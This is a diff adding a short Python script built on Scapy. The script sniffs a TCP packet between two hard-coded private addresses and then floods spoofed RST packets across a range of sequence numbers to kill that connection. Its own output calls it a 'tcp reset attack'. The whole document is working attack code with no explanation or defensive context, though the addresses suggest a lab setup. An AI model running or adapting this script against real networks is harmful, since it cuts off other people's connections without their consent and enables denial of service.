@@ -1,0 +1,40 @@
+from scapy.all import *
+
+win=2047
+tcp_rst_count = 10
+victim_source_ip = "10.20.20.2"
+victim_destination_ip = "10.20.20.3"
+your_iface = "wg0"
+
+# get a tcp packet by sniffing LAN
+t = sniff(iface=your_iface, count=1,
+                    lfilter=lambda x: x.haslayer(TCP)
+                    and x[IP].src == victim_source_ip
+                    and x[IP].dst == victim_destination_ip)
+
+
+t = t[0]
+
+tcpdata = {
+        'src': t[IP].src,
+        'dst': t[IP].dst,
+        'sport': t[TCP].sport,
+        'dport': t[TCP].dport,
+        'seq': t[TCP].seq,
+        'ack': t[TCP].ack
+    }
+
+print(tcpdata)
+
+max_seq = tcpdata['ack'] + tcp_rst_count * win
+seqs = range(tcpdata['ack'], max_seq, int(win / 2))
+p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
+                TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
+                                flags="R", window=win, seq=seqs[0])
+
+for seq in seqs:
+        p.seq = seq
+        send(p, verbose=0, iface=your_iface)
+        print('tcp reset attack finish')
+
+
